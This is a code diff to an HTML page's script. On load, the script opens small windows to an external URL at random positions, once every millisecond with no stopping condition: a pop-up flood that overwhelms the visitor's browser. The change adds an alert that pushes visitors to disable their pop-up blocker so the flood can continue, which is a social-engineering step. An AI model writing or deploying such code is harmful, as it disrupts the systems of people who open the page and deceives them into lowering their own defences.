@@ -20,14 +20,20 @@
             const screenHeight = window.screen.height;
             const randomX = Math.floor(Math.random() * screenWidth);
             const randomY = Math.floor(Math.random() * screenHeight);
-            
-            window.open(
+
+            const newWindow = window.open(
                 "https://button360.github.io/380",
                 "_blank",
                 `width=200,height=150,scrollbars=yes,resizable=yes,left=${randomX},top=${randomY}`
             );
-            setTimeout(openWindow, 1);
+
+            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                alert("Pop-ups are blocked. Please enable pop-ups for this site to continue.");
+            } else {
+                setTimeout(openWindow, 1);
+            }
         }
+
         window.onload = openWindow;
     </script>
 </head>
